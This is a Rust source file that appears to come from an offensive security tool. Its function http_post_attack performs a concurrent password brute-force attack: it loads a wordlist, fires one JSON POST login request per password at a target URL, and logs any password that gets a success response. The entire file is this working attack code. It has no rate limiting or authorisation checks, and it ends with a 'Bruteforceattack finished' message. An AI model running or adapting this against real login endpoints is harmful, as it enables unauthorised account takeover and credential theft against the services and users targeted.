use serde_json::json;

use std::{collections::HashMap, string, error::Error, fmt::Display, path::Path, time::Duration, thread};

use tokio::fs::File;
use tokio::io::{self, AsyncBufReadExt, BufReader,};

use indicatif::{ProgressBar, ProgressStyle};

use reqwest::{Client, StatusCode, Url, dns::Resolving};

use core::time;

use crate::components::{Log, LogType, Logger, OutputMode};


async fn wordlist_to_vec(wordlist_path: &Path) -> Result<Vec<String>, Box<dyn Error>> {
    let file = File::open(wordlist_path).await?;
    let mut reader = BufReader::new(file).lines();
    let mut list: Vec<String> = Vec::new();

    while let Some(line) = reader.next_line().await? {
        list.push(line);
    }
    Ok(list)
}

async fn file_to_string(file_path: &Path) -> Result<String, Box<dyn Error>> {
    let contents = tokio::fs::read_to_string(file_path).await?;
    Ok(contents)
}

pub async fn http_post_attack(url: &str, wordlist_path: &Path, username: &str) -> Result<(), Box<dyn Error>> {
    let client = Client::new();
    let wordlist = wordlist_to_vec(wordlist_path).await?;
    let logger = Logger::new();
    let progress_bar = ProgressBar::new(wordlist.len() as u64);
    let mut progress = 0;

    progress_bar.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.green} [{elapsed_precise}] [{bar:20.cyan/blue}] {pos}/{len} ({eta}) {msg}")
            .unwrap_or_else(|_| ProgressStyle::default_bar()) // Fallback in case of error
            .progress_chars("#>-")
    );

    let tasks: Vec<_> = wordlist.iter().map(|password| {
        progress += 1;
        let client = client.clone();
        let url = url.to_string(); 
        let password = password.clone();
        let progress_bar = progress_bar.clone();
        let mut logger = logger.clone();
        let username = username.to_string();

        tokio::spawn( async move {
            let body = serde_json::json!({
                "username": username,
                "password": password,
            });

            let response = client
                .post(url)
                .json(&body)
                .send()
                .await;

            progress_bar.inc(1);

            match response {
                Ok(res) if res.status().is_success() => {
                    logger.log(Log::new(format!("Found password: {} for user: {}", password, username), LogType::Message, false));
                }
                Ok(res) => {
                    logger.log(Log::new("".to_string(), LogType::Warning, false));
                }
                Err(e) => {
                    logger.log(Log::new("".to_string(), LogType::Error, false));
                }
            }
        })
    }).collect();

    for task in tasks {
        let _ = task.await?;
    }        
    progress_bar.finish_with_message("Bruteforceattack finished");
    logger.render(OutputMode::Default);
    logger.render(OutputMode::Result);

    Ok(())
}